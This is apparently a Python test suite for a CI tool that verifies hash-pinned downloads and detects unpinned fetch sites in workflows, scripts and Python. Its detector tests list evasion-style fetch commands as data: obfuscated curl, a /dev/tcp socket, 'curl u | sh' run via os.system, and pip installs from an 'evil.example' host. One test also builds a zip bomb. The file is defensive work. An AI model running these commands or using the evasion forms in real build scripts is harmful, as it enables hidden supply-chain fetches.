"""CI-pin-liveness (#6424): tools/pins.py, the one reader for pinned external downloads.

REQ: CI-pin-liveness-1 (one format, fail closed), CI-pin-liveness-2 (the hash is the only authority),
CI-pin-liveness-3 (liveness names each dead source), CI-pin-liveness-4 (every pin and download
site is covered or owed by a release row), CI-pin-liveness-fu (#6524: the owed lists shrink against
main, fetch sites are found structurally and counted per file, `live` opens only a zip that matched),
CI-pin-liveness-fu2 (#6549: this reader and its test are gate files; attribute and dynamic Python reach
and unchecked package-manager fetches are sites).
"""
import hashlib
import io
import os
import pathlib
import re
import subprocess
import sys
import tempfile
import unittest
import zipfile
from unittest import mock

ROOT = pathlib.Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "tools"))
import pins  # noqa: E402
import premerge  # noqa: E402

A = b"alpha bytes"
B = b"beta bytes"
HA = hashlib.sha256(A).hexdigest()
HB = hashlib.sha256(B).hexdigest()
U1 = "https://example.org/a/alpha.bin"
U2 = "https://mirror.example.net/alpha.bin"


def zipped(member, data):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr(member, data)
    return buf.getvalue()


class Parse(unittest.TestCase):
    def test_a_well_formed_file(self):
        text = "# c\n\n%s  alpha.bin  %s\n%s  alpha.bin  %s\n%s  b.bin %s\n" % (HA, U1, HA, U2, HB, U1)
        got = [(p.line, p.name, p.source) for p in pins.parse("f.pins", text)]
        self.assertEqual(got, [(3, "alpha.bin", U1), (4, "alpha.bin", U2), (5, "b.bin", U1)])

    def test_every_other_line_fails_naming_its_line(self):
        bad = [
            "%s  alpha.bin" % HA,                                   # two fields
            "%s  alpha.bin  %s  extra" % (HA, U1),                  # four
            "%s  alpha.bin  %s" % (HA.upper(), U1),                 # uppercase hex
            "%s  alpha.bin  %s" % (HA[:63], U1),                    # short hash
            "%s  alpha.bin  http://example.org/a" % HA,             # not https
            "%s  alpha.bin  https://u:p@example.org/a" % HA,        # userinfo
            "%s  alpha.bin  https://example.org" % HA,              # no path
            "%s  alpha.bin  ftp://example.org/a" % HA,
            "%s\talpha.bin\t%s" % (HA, U1),                         # tabs
            "%s  -x  %s" % (HA, U1),                                # name starts with a dash
            "%s  lib.so  nothere.whl:lib.so" % HA,                  # member of no earlier pin
            " %s  alpha.bin  %s x" % (HA, U1),
            "sha256:%s  alpha.bin  %s" % (HA, U1),
        ]
        for line in bad:
            with self.subTest(line=line):
                with self.assertRaisesRegex(pins.PinError, r"^f\.pins:2: "):
                    pins.parse("f.pins", "# head\n" + line + "\n")

    def test_a_name_pins_once_except_consecutive_alternatives_of_one_hash(self):
        for text in ["%s  a  %s\n%s  b  %s\n%s  a  %s\n" % (HA, U1, HB, U1, HA, U2),   # not consecutive
                     "%s  a  %s\n\n%s  a  %s\n" % (HA, U1, HA, U2),                     # blank between
                     "%s  a  %s\n%s  a  %s\n" % (HA, U1, HB, U2),                       # another hash
                     "%s  w  %s\n%s  a  w:x\n%s  a  w:y\n" % (HA, U1, HB, HB)]:         # member twice
            with self.subTest(text=text):
                self.assertRaisesRegex(pins.PinError, r"pinned again", pins.parse, "f.pins", text)
        self.assertEqual(len(pins.parse("f", "%s  a  %s\n# c\n%s  a  %s\n" % (HA, U1, HA, U2))), 2)

    def test_a_member_names_an_earlier_downloaded_pin(self):
        ok = pins.parse("f", "%s  w.whl  %s\n%s  lib.so  w.whl:x/lib.so\n" % (HA, U1, HB))
        self.assertEqual(ok[1].source, "w.whl:x/lib.so")
        for text in ["%s  lib.so  w.whl:x\n%s  w.whl  %s\n" % (HB, HA, U1),              # later
                     "%s  w  %s\n%s  m  w:x\n%s  n  m:y\n" % (HA, U1, HB, HB)]:           # member of member
            with self.subTest(text=text):
                self.assertRaisesRegex(pins.PinError, "not a member of an earlier downloaded pin",
                                       pins.parse, "f", text)


class Fetch(unittest.TestCase):
    def setUp(self):
        self.dir = tempfile.TemporaryDirectory()
        self.addCleanup(self.dir.cleanup)
        self.file = os.path.join(self.dir.name, "x.pins")
        self.dest = os.path.join(self.dir.name, "out.bin")

    def write(self, text):
        pathlib.Path(self.file).write_text(text)

    def serve(self, table):
        """A download stand-in: URL -> bytes, or absent for a failed download."""
        tried = []

        def fake(url, dest):
            tried.append(url)
            if url not in table:
                return False
            pathlib.Path(dest).write_bytes(table[url])
            return True
        return fake, tried

    def leftovers(self):
        return sorted(n for n in os.listdir(self.dir.name) if n.startswith(".pin-"))

    def test_the_first_source_that_serves_the_pinned_bytes_wins(self):
        self.write("%s  alpha.bin  %s\n%s  alpha.bin  %s\n" % (HA, U1, HA, U2))
        fake, tried = self.serve({U2: A})
        with mock.patch.object(pins, "download", fake):
            pins.fetch(self.file, "alpha.bin", self.dest)
        self.assertEqual(pathlib.Path(self.dest).read_bytes(), A)
        self.assertEqual(tried, [U1, U2])
        self.assertEqual(self.leftovers(), [])

    def test_bytes_that_miss_the_pin_end_the_fetch_and_write_nothing(self):
        self.write("%s  alpha.bin  %s\n%s  alpha.bin  %s\n" % (HA, U1, HA, U2))
        fake, tried = self.serve({U1: B, U2: A})
        with mock.patch.object(pins, "download", fake):
            with self.assertRaisesRegex(pins.PinError, "x.pins:1: alpha.bin from %s hashes to %s, pinned %s"
                                        % (re.escape(U1), HB, HA)):
                pins.fetch(self.file, "alpha.bin", self.dest)
        self.assertEqual(tried, [U1])  # a second source never outvotes a wrong first one
        self.assertFalse(os.path.exists(self.dest))
        self.assertEqual(self.leftovers(), [])

    def test_no_source_serving_fails_naming_the_pin(self):
        self.write("%s  alpha.bin  %s\n" % (HA, U1))
        pathlib.Path(self.dest).write_bytes(b"old")
        fake, _ = self.serve({})
        with mock.patch.object(pins, "download", fake):
            self.assertRaisesRegex(pins.PinError, "x.pins:1: alpha.bin did not download from any of its 1",
                                   pins.fetch, self.file, "alpha.bin", self.dest)
        self.assertEqual(pathlib.Path(self.dest).read_bytes(), b"old")
        self.assertEqual(self.leftovers(), [])

    def test_unknown_names_and_members_are_refused(self):
        self.write("%s  w.whl  %s\n%s  lib.so  w.whl:lib.so\n" % (HA, U1, HB))
        fake, tried = self.serve({U1: A})
        with mock.patch.object(pins, "download", fake):
            self.assertRaisesRegex(pins.PinError, "no pin named nope", pins.fetch, self.file, "nope", self.dest)
            self.assertRaisesRegex(pins.PinError, "x.pins:2: lib.so is a member", pins.fetch, self.file,
                                   "lib.so", self.dest)
        self.assertEqual(tried, [])

    def test_verify(self):
        self.write("%s  alpha.bin  %s\n" % (HA, U1))
        pathlib.Path(self.dest).write_bytes(A)
        pins.verify(self.file, "alpha.bin", self.dest)
        pathlib.Path(self.dest).write_bytes(B)
        self.assertRaisesRegex(pins.PinError, "x.pins:1: .* hashes to %s, pinned %s" % (HB, HA),
                               pins.verify, self.file, "alpha.bin", self.dest)

    def test_the_command_line(self):
        self.write("%s  alpha.bin  %s\n" % (HA, U1))
        pathlib.Path(self.dest).write_bytes(B)
        run = lambda *a: subprocess.run([sys.executable, "-I", str(ROOT / "tools" / "pins.py"), *a],
                                        capture_output=True, text=True)
        r = run("get", self.file, "alpha.bin")
        self.assertEqual((r.returncode, r.stdout), (0, HA + "\n"))
        r = run("verify", self.file, "alpha.bin", self.dest)
        self.assertEqual(r.returncode, 1)
        self.assertIn("::error::%s:1: " % self.file, r.stderr)
        self.assertEqual(run("get", self.file).returncode, 2)
        self.assertEqual(run("bogus", "a", "b").returncode, 2)

    def test_curl_reads_no_config_and_stays_on_https(self):
        for flag in (["-q"], ["--proto", "=https"], ["--proto-redir", "=https"], ["-fsSL"]):
            with self.subTest(flag=flag):
                i = pins.CURL.index(flag[0])
                self.assertEqual(pins.CURL[i:i + len(flag)], flag)
        self.assertIn(pins.CURL[0], pins.FETCHERS)
        self.assertEqual(pins.CURL[1], "-q")  # -q is only honoured first


class Live(unittest.TestCase):
    def check(self, text, table):
        d = tempfile.TemporaryDirectory()
        self.addCleanup(d.cleanup)
        f = os.path.join(d.name, "l.pins")
        pathlib.Path(f).write_text(text)

        def fake(url, dest):
            if url not in table:
                return False
            pathlib.Path(dest).write_bytes(table[url])
            return True
        with mock.patch("sys.stdout", new_callable=io.StringIO):
            return [p.replace(f, "l.pins") for p in pins.live([f], fake)]

    def test_all_live(self):
        z = zipped("x/lib.so", B)
        text = "%s  w.whl  %s\n%s  lib.so  w.whl:x/lib.so\n%s  a  %s\n%s  a  %s\n" % (
            hashlib.sha256(z).hexdigest(), U1, HB, HA, "https://e.org/a", HA, U2)
        self.assertEqual(self.check(text, {U1: z, "https://e.org/a": A, U2: A}), [])

    def test_each_dead_or_changed_source_is_named(self):
        z = zipped("x/lib.so", B)
        hz = hashlib.sha256(z).hexdigest()
        text = "%s  w.whl  %s\n%s  lib.so  w.whl:x/lib.so\n%s  gone.so  w.whl:x/gone.so\n%s  a  %s\n%s  a  %s\n" % (
            hz, U1, HA, HA, HA, "https://e.org/a", HA, U2)
        got = self.check(text, {U1: z, "https://e.org/a": B})
        self.assertEqual(got, [
            "l.pins:2: lib.so from w.whl:x/lib.so now hashes to %s, pinned %s" % (HB, HA),
            "l.pins:3: gone.so: \"There is no item named 'x/gone.so' in the archive\"",
            "l.pins:4: a from https://e.org/a now hashes to %s, pinned %s" % (HB, HA),
            "l.pins:5: a no longer downloads from %s" % U2,
        ])

    def test_a_dead_zip_names_its_members(self):
        text = "%s  w.whl  %s\n%s  lib.so  w.whl:x/lib.so\n" % (HA, U1, HB)
        self.assertEqual(self.check(text, {}), ["l.pins:1: w.whl no longer downloads from %s" % U1,
                                                "l.pins:2: lib.so: its zip w.whl did not download with its "
                                                "pinned bytes"])
        self.assertEqual(self.check("%s  w.whl  %s\n%s  lib.so  w.whl:x/lib.so\n" % (HA, U1, HB), {U1: A}),
                         ["l.pins:2: lib.so: File is not a zip file"])

    def test_a_zip_that_misses_its_pin_is_never_opened(self):
        z = zipped("x/lib.so", B)
        text = "%s  w.whl  %s\n%s  lib.so  w.whl:x/lib.so\n" % (HA, U1, HB)
        with mock.patch.object(pins.zipfile, "ZipFile", side_effect=AssertionError("opened")):
            got = self.check(text, {U1: z})
        self.assertEqual(got, ["l.pins:1: w.whl from %s now hashes to %s, pinned %s" % (U1, hashlib.sha256(z).hexdigest(), HA),
                               "l.pins:2: lib.so: its zip w.whl did not download with its pinned bytes"])

    def test_a_member_past_the_bound_is_refused_whatever_its_header_says(self):
        z = zipped("x/lib.so", B * 4)
        hz = hashlib.sha256(z).hexdigest()
        text = "%s  w.whl  %s\n%s  lib.so  w.whl:x/lib.so\n" % (hz, U1, hashlib.sha256(B * 4).hexdigest())
        self.assertEqual(self.check(text, {U1: z}), [])
        with mock.patch.object(pins, "MEMBER_MAX", len(B) * 4 - 1):
            self.assertEqual(self.check(text, {U1: z}), ["l.pins:2: lib.so: x/lib.so is over %d bytes" % (len(B) * 4 - 1)])
        # A deflated member that expands past the bound (a zip bomb) stops at the bound.
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as w:
            w.writestr("x/lib.so", b"\0" * (3 << 20))
        bomb = buf.getvalue()
        self.assertLess(len(bomb), 1 << 16)
        with mock.patch.object(pins, "MEMBER_MAX", 1 << 20):
            got = self.check("%s  w.whl  %s\n%s  lib.so  w.whl:x/lib.so\n" % (hashlib.sha256(bomb).hexdigest(), U1, HB),
                             {U1: bomb})
        self.assertEqual(got, ["l.pins:2: lib.so: x/lib.so is over %d bytes" % (1 << 20)])

    def test_an_unreadable_pin_file_is_a_problem(self):
        got = self.check("not a pin\n", {})
        self.assertEqual(len(got), 1)
        self.assertRegex(got[0], r"^l\.pins: unreadable: l\.pins:1: ")


class Repository(unittest.TestCase):
    """CI-pin-liveness-4: the repository's pins and download sites."""

    def test_every_tracked_pin_file_parses_or_is_owed(self):
        tracked = pins.tracked()
        self.assertIn("tools/fetch.pins", tracked)
        self.assertIn("broker/cmd/agentos-vision/models.pins", tracked)
        for f in tracked:
            with self.subTest(f=f):
                if f in pins.NOT_YET:
                    self.assertRegex(pins.NOT_YET[f], r"^#[1-9][0-9]*$")
                    # Shrink-only: a file that parses now leaves the list, so live checks it.
                    self.assertRaises(pins.PinError, pins.load, ROOT / f)
                else:
                    self.assertTrue(pins.load(ROOT / f), f)
        self.assertEqual(sorted(set(pins.NOT_YET) - set(tracked)), [], "NOT_YET names an untracked file")

    def test_every_direct_fetch_is_owed_or_exempt_site_for_site(self):
        kinds = pins.scanned()
        for f in (".github/workflows/formal.yml", ".github/actions/scope/action.yml", "image/build.sh",
                  "tools/board.py", "image/mkosi/mkosi.extra/usr/lib/agentos/health"):
            self.assertIn(f, kinds)  # workflows, actions, scripts with and without an extension, Python
        self.assertNotIn("tools/pins.py", kinds)
        found = {f: n for f, n in ((f, pins.fetch_sites(ROOT / f, k)) for f, k in kinds.items()) if n}
        listed = {f: v[1] for f, v in pins.FETCH_NOT_YET.items()}
        listed.update({f: v[0] for f, v in pins.FETCH_EXEMPT.items()})
        self.assertEqual(found, listed, "fetch through tools/pins.py, or set the file's count to what it holds")
        self.assertEqual(set(pins.FETCH_NOT_YET) & set(pins.FETCH_EXEMPT), set())
        for row, _ in pins.FETCH_NOT_YET.values():
            self.assertRegex(row, r"^#[1-9][0-9]*$")
        self.assertNotIn(".github/workflows/formal.yml", found)

    def test_the_owed_lists_hold_nothing_mains_copy_lacks(self):
        def git(*a):
            return subprocess.run(["git", "-C", str(ROOT), *a], capture_output=True, text=True)
        base = git("merge-base", "HEAD", "origin/main")
        self.assertEqual(base.returncode, 0, "no origin/main to compare the owed lists with: " + base.stderr)
        text = git("show", base.stdout.strip() + ":tools/pins.py")
        self.assertEqual(text.returncode, 0, text.stderr)
        head = (ROOT / "tools/pins.py").read_text()
        self.assertEqual(pins.grown(text.stdout, head), [])
        # The literals read are the lists in force: nothing later in the file adds to them.
        self.assertEqual(pins.owed(head), {"NOT_YET": {f: None for f in pins.NOT_YET},
                                           "FETCH_NOT_YET": {f: v[1] for f, v in pins.FETCH_NOT_YET.items()}})


    def test_the_tlc_pin_is_the_one_vectors_py_checks(self):
        src = (ROOT / "broker/kernel/formal/vectors.py").read_text()
        want = re.search(r'^JAR_SHA256 = "([0-9a-f]{64})"$', src, re.M).group(1)
        self.assertEqual(pins.sources(ROOT / "tools/fetch.pins", "tla2tools.jar")[0].sha, want)
        self.assertIn("tools/pins.py fetch tools/fetch.pins tla2tools.jar",
                      (ROOT / ".github/workflows/formal.yml").read_text())

    def test_the_liveness_workflow_runs_daily_over_every_pin(self):
        w = (ROOT / ".github/workflows/pin-liveness.yml").read_text()
        self.assertRegex(w, r'\n  schedule:\n    - cron: "\d+ \d+ \* \* \*"\n')
        self.assertIn("\n        run: python3 -I tools/pins.py live\n", w)
        self.assertNotIn("pull_request", w)
        self.assertIn("\npermissions:\n  contents: read\njobs:\n", w)
        self.assertEqual(w.count("permissions:"), 1)
        for f in ("tools/fetch.pins", "tools/pins.py", ".github/workflows/pin-liveness.yml"):
            self.assertNotIn("weekly", (ROOT / f).read_text(), f)  # the schedule above is daily
        self.assertIn(" downloads every\n# source daily ", (ROOT / "tools/fetch.pins").read_text())


class Grown(unittest.TestCase):
    """CI-pin-liveness-fu item 1: NOT_YET and FETCH_NOT_YET only shrink against main."""
    BASE = ('NOT_YET = {"a.pins": "#1", "b.pins": "#1"}\n'
            'FETCH_NOT_YET = {"x.yml": ("#1", 2), "y.sh": ("#1", 1)}\n')

    def test_a_removed_entry_or_a_lower_count_passes(self):
        head = 'NOT_YET = {"a.pins": "#1"}\nFETCH_NOT_YET = {"x.yml": ("#1", 1)}\n'
        self.assertEqual(pins.grown(self.BASE, head), [])
        self.assertEqual(pins.grown(self.BASE, self.BASE), [])

    def test_an_added_entry_or_a_higher_count_fails(self):
        head = ('NOT_YET = {"a.pins": "#1", "b.pins": "#1", "c.pins": "#2"}\n'
                'FETCH_NOT_YET = {"x.yml": ("#1", 3), "y.sh": ("#1", 1), "z.py": ("#1", 1)}\n')
        self.assertEqual(pins.grown(self.BASE, head), ["FETCH_NOT_YET raises x.yml from 2 to 3", "FETCH_NOT_YET adds z.py",
                                                       "NOT_YET adds c.pins"])

    def test_a_base_without_counts_still_refuses_a_new_file(self):
        base = 'NOT_YET = {}\nFETCH_NOT_YET = {"x.yml": "#1"}\n'
        self.assertEqual(pins.grown(base, 'NOT_YET = {}\nFETCH_NOT_YET = {"x.yml": ("#1", 9)}\n'), [])
        self.assertEqual(pins.grown(base, 'NOT_YET = {}\nFETCH_NOT_YET = {"q.sh": ("#1", 1)}\n'),
                         ["FETCH_NOT_YET adds q.sh"])

    def test_a_list_that_is_not_a_literal_fails(self):
        for text in ['NOT_YET = {}\n', 'NOT_YET = dict()\nFETCH_NOT_YET = {}\n']:
            with self.subTest(text=text):
                self.assertRaises((pins.PinError, ValueError), pins.owed, text)


class Sites(unittest.TestCase):
    """CI-pin-liveness-fu item 2: fetch sites are found by structure, not by a line pattern."""

    def test_each_shell_bypass_is_a_site(self):
        for text in ["curl -o f https://e.org/f", "/usr/bin/curl -o f u", "curl\\\n  -o f u", "x=curl; $x -o f u",
                     "X=\"/usr/bin/wget\"\n\"$X\" u", "$(command -v curl) u", "a|xargs -n1 curl", "sudo aria2c u",
                     "python3 -c 'import urllib.request as r; r.urlopen(u)'",
                     "gh release download v1 -R o/r", "gh release \\\n  download v1", "echo ok; `curl u`",
                     "# a comment ending in a backslash \\\ncurl -o f u", "curl \\\n# c\n -o f u",
                     'cu""rl -o f u', "cu''rl u", "c\\url -o f u", "exec 3<>/dev/tcp/e.org/80", "cu\\\nrl u"]:
            with self.subTest(text=text):
                self.assertGreater(pins.text_sites(text), 0)

    def test_plain_text_is_not_a_site(self):
        for text in ["libcurl-dev --with-curl curl.h curly", "pins.py fetch f n d",
                     "import urllib.parse", "git release-download"]:
            with self.subTest(text=text):
                self.assertEqual(pins.text_sites(text), 0)

    def test_sites_are_counted_so_a_new_one_in_an_owed_file_shows(self):
        self.assertEqual(pins.text_sites("curl a\nwget b\n# curl c\ncurl d; curl e\n"), 5)
        # A comment line is read: it may sit inside a quoted string or heredoc, where shell expands it.
        self.assertEqual(pins.text_sites('x="\n# $(curl -o f u)"\n'), 1)

    def test_every_yaml_scalar_is_read_with_escapes_decoded(self):
        wf = ("on: push\njobs:\n  j:\n    steps:\n      - run: |\n          echo hi\n"
              "          # curl in a comment\n      - run: \"\\x63url u\"\n"
              "      - uses: a/b@0\n        with:\n          script: wget u\n        env:\n          C: curl\n")
        self.assertEqual(pins.yaml_sites(wf), 4)  # the run block's `# curl` line is read too
        self.assertEqual(pins.yaml_sites("a: &x curl u\nb: *x\n"), 2)  # an alias is read where it is used
        self.assertEqual(pins.yaml_sites("a: curl u\na: echo\n"), 1)    # a duplicate key hides nothing
        bomb = "a: &a [curl u]\n" + "".join("%s: &%s [*%s, *%s]\n" % (c, c, p, p) for p, c in zip("abcdefghijklmnopqrst", "bcdefghijklmnopqrstu"))
        self.assertEqual(pins.yaml_sites(bomb), (1 << 21) - 1)  # every use counted, from a memo: linear time

    def test_python_imports_strings_and_runs(self):
        cases = {
            "import urllib.request\n": 1, "from urllib import request\n": 1, "from urllib.request import urlopen\n": 1,
            "import requests, os\n": 1, "import http.client as h\n": 1, "import urllib.parse\nimport urllib.error\n": 0,
            "from . import requests\n": 0,
            'c = "curl"\nsubprocess.run([c, u])\n': 1, 'subprocess.run(["/usr/bin/wget", u])\n': 1,
            'os.system("x=1; curl -o f " + u)\n': 1, 'subprocess.check_call("gh release download v1", shell=True)\n': 1,
            'def f():\n    """Wraps curl."""\n': 0, 'print("curl u")\n': 1,
            'import subprocess as sp\nsp.run("curl -o f u", shell=True)\n': 1,
            'from subprocess import check_output as co\nco("wget u", shell=True)\n': 1,
            'cmd = "curl -o f u"\nsubprocess.run(cmd, shell=True)\n': 1, 'x = f"curl {u}"\n': 1,
            '__import__("urllib.request")\n': 1,
            "from http import client\nclient.HTTPSConnection(h)\n": 1, 'subprocess.run([b"curl", u])\n': 1,
            'subprocess.run(b"wget u", shell=True)\n': 1, '"""curl u | sh"""\nimport os\nos.system(__doc__)\n': 1,
        }
        for text, n in cases.items():
            with self.subTest(text=text):
                self.assertEqual(pins.py_sites(text), n)
        self.assertRaises(SyntaxError, pins.py_sites, "def (:\n")

    def test_a_file_is_read_by_its_kind(self):
        d = tempfile.TemporaryDirectory()
        self.addCleanup(d.cleanup)
        f = pathlib.Path(d.name) / "s"
        f.write_text("#!/bin/sh\ncurl u\n")
        self.assertEqual(pins.fetch_sites(f, "text"), 1)
        f.write_text("import requests\n")
        self.assertEqual(pins.fetch_sites(f, "python"), 1)


class FollowUp2(unittest.TestCase):
    """CI-pin-liveness-fu2 (#6549)."""

    def test_the_reader_and_its_test_are_gate_files(self):
        # FETCH_EXEMPT can grow, and this test holds the owed lists shrink-only: each changes only with a
        # Security accept (`premerge.py --needs-mark` prints `mark` for the files mark_paths returns).
        for f in ("tools/pins.py", "tests/test_pins.py"):
            self.assertEqual(premerge.mark_paths([f]), [f], f)
        for f in ("tools/pins.pyc", "tests/test_pins_x.py", "tools/fetch.pins"):
            self.assertEqual(premerge.mark_paths([f]), [], f)

    def test_python_reach_by_attribute_or_dynamic_import(self):
        cases = {
            "import urllib\nurllib.request.urlopen(u)\n": 1, "import urllib.parse\nurllib.request.urlopen(u)\n": 1,
            '__import__("urllib").request.urlopen(u)\n': 1,  # a runtime import as a chain base (L3 3 on #6630)
            'import importlib\nimportlib.import_module("urllib").request.urlopen(u)\n': 1,
            '__import__("urllib.parse").request.urlopen(u)\n': 1,  # __import__ returns the top package
            "import urllib as x\nx.request.urlopen(u)\nx.request.Request(v)\n": 1,  # once per file per module
            "import http\nhttp.client.HTTPSConnection(h)\nimport urllib\nurllib.request.urlopen(u)\n": 2,
            "import urllib.request\nurllib.request.urlopen(u)\nurllib.request.Request(u)\n": 1,  # the import only
            "from urllib import request as rq\nrq.urlopen(u)\n": 1,
            "import urllib\nurllib.parse.quote(u)\n": 0, "requests = []\nrequests.append(1)\n": 0,
            'out = {"requests": []}\n': 0, "self.urllib.request.x\n": 0,
            'importlib.import_module("requests")\n': 1, 'import_module("urllib3.util")\n': 1,
            '__import__("http.client")\n': 1, 'importlib.import_module("json")\n': 0,
            # An import nested deeper than its use still binds it (L3 1 on #6593).
            "if True:\n    try:\n        import urllib\n    except ImportError:\n        pass\nr = urllib.request\nr.urlopen(x)\n": 1,
            "try:\n    if True:\n        import urllib\nexcept ImportError:\n    urllib = None\nu = urllib.request\n": 1,
            "from importlib import import_module as im\nim('requests')\n": 1, "import xmlrpc.client\n": 1,
            # Every binding of a name is resolved, not the last (Potency R3 on #6593).
            "import urllib as u\ndef f():\n    import os as u\nu.request.urlopen(1)\n": 1,
        }
        for text, n in cases.items():
            with self.subTest(text=text):
                self.assertEqual(pins.py_sites(text), n)

    def test_package_manager_fetches_their_own_check_misses(self):
        for text in ["pip install foo==1", "python3 -m pip install x", '"$V/bin/pip" -q install x', "pip3.12 download x",
                     "cd d && pip install -r r.txt", "npm install x", "npm i", "yarn add x", "pnpm dlx x", "npx foo",
                     "sudo npx foo", "GOSUMDB=off go install x@v1", "GONOSUMDB=x go get y", "GOFLAGS=-insecure go get x",
                     "export GOPRIVATE=x", "GOINSECURE=x go mod download",
                     "pip install foo==1  # TODO: --require-hashes once #6588 lands", "time npx foo",
                     "timeout 60 npx foo", "nohup npx foo", "xargs npx foo", "nice -n 5 npx foo", "yarn install",
                     "pnpm install", "npm install evil --frozen-lockfile", "npm i x --immutable",
                     "yarn add evil --frozen-lockfile", "pnpm add evil --frozen-lockfile", "yarn",
                     # No flag is credited to yarn or pnpm: yarn 1 ignores --immutable (L3 2, Potency 2 on #6593).
                     "yarn install --immutable", "yarn install --frozen-lockfile", "pnpm i --frozen-lockfile",
                     # Comment and flag tests read raw words, not basenames (L3 1, Potency 1 on #6593).
                     "PIP_CACHE_DIR=/tmp/#c pip install foo", "HOME=/tmp/#x pip install foo",
                     "pip install --index-url https://h/--require-hashes foo",
                     "sudo -u bob npx foo", "timeout -s KILL 60 npx foo", "xargs -I % npx foo %",
                     # Fail closed (step back on #6593): a `#` word never hides a name, and no credit is read
                     # from a line whose quotes or backslashes move a word, command or comment boundary.
                     'X="a #b" pip install foo', "X='a #b' pip install foo", 'X="a #b" npx foo',
                     "pip --cache-dir '#d' install foo", "npm --prefix '#p' install evil", "# pip install foo",
                     'env "A=;"tar npx foo', 'pip install foo "x --require-hashes"',
                     "pip install foo\\ --require-hashes", "pip install --require-hashes foo 'x",
                     # Deny by default (Security and L3 on #6630): every manager word the broad split finds counts
                     # unless a whole word is a known-safe form; an option can take no credit word as its value.
                     "pip install --log --require-hashes foo", "pip install --no-binary --require-hashes foo",
                     "npm in foo", "npm isntall foo", "npm it", "npm update", "npm up evil", "npm init vite",
                     "npm create vite", "{npm,install,foo}", "{pip,install,foo}", "{npx,cowsay}", "npx${IFS}cowsay",
                     "npm${IFS}install foo", "python3 -mpip install foo", "pip wheel foo", "pip3 wheel -w d evil",
                     "P=pip; $P install evil", "N=npx; $N evil", "{pip,} install evil", "tar -I npx -xf a.tar",
                     "echo ok  # npx foo", "npm ci evil", "npm ci $X", "pip install --require-hashes foo",
                     "tar x $n/bin/npx", "pip install -r --require-hashes",
                     # L3 and Security on #6630 at b77d7006: no credit for a `-r` URL (its hashes are the
                     # server's), a tar that may run a program, or a glob; names glued to options and variants count.
                     "pip install --require-hashes -r https://evil.example/r.txt",
                     "pip install --require-hashes --requirement=https://evil.example/r.txt",
                     "pip install --require-hashes -r r.txt -r https://x/y", "/usr/bin/pi[p] install evil",
                     "/usr/local/bin/pi? install evil", "/usr/bin/pip* install evil", "tar cIf yarn o.tar f",
                     "tar -cf o.tar -Iyarn f", "env -Syarn", "env -Snpx", "yarnpkg add x", "pip-3.12 install x",
                     "pip-3 install x", "node /usr/lib/node_modules/npm/bin/npm-cli.js install foo", "node yarn.js",
                     "tar xIf npx a.tar", 'tar --to-command=x -xf a "$n/bin/npx"',
                     "pi[p] install --require-hashes -r r.txt",
                     # L3 on #6630 at 970041e7: `name@version` and corepack count; neither earns credit.
                     "yarn@1.22.22 add x", "npm@10 ci", "corepack enable", "pip@x install --require-hashes -r r.txt",
                     # Security on #6630 at 970041e7: make's `@`, `+` and `-` recipe prefixes hide no name or
                     # fetcher, and a file-tool credit needs a path argument in text that redefines no command.
                     "\t@yarn install", "\t@npm install evil", "\t@pip install foo", "\t+yarn add evil",
                     "\t@-yarn add x", "\t@curl -o x https://h/x", "\t+wget x", 'cp() { "$@"; }\ncp yarn add evil',
                     'cp() { "$@"; }\ntar x "$n/bin/npx"', 'function tar { :; }\ntar x "$n/bin/npx"',
                     'alias tar=x\ntar x "$n/bin/npx"', '. ./lib.sh\ntar x "$n/bin/npx"',
                     'source lib.sh\ntar x "$n/bin/npx"', "tar x npx", "echo npm", "\t@pi[p] install x", "tar -cf o.tar -Ipi[p] f"]:
            with self.subTest(text=text):
                self.assertEqual(pins.text_sites(text), 1)
        for text in ["corepack yarn@1 add x", "corepack pnpm@8 i"]:  # corepack and the manager it runs
            with self.subTest(text=text):
                self.assertEqual(pins.text_sites(text), 2)
        for text in ["pip install --require-hashes -r r.txt", "python -m pip install --no-deps --require-hashes \\\n  -r r.txt",
                     "npm ci --ignore-scripts", "go install x@v1.2.3", "go mod download", 'tar x "$n/bin/npx" "$n/bin/npm"',
                     "pip list", "GOSUMDB=sum.golang.org go get x", "set -o pipefail", "pipx run x", "cat npm.log",
                     'tar -xJf "$w/n.tar.xz" --strip-components=1 -C usr/local "$n/bin/npm" "$n/bin/npx"',
                     'pip install --require-hashes -r "$R"', "tar 'x' \"$n/bin/npx\"", "pip show x",
                     "python -m pip install --no-deps --only-binary=:all: --require-hashes -r tests/requirements.txt"]:
            with self.subTest(text=text):
                self.assertEqual(pins.text_sites(text), 0)
        self.assertEqual(pins.py_sites('subprocess.run("pip install x", shell=True)\n'), 1)


if __name__ == "__main__":
    unittest.main()
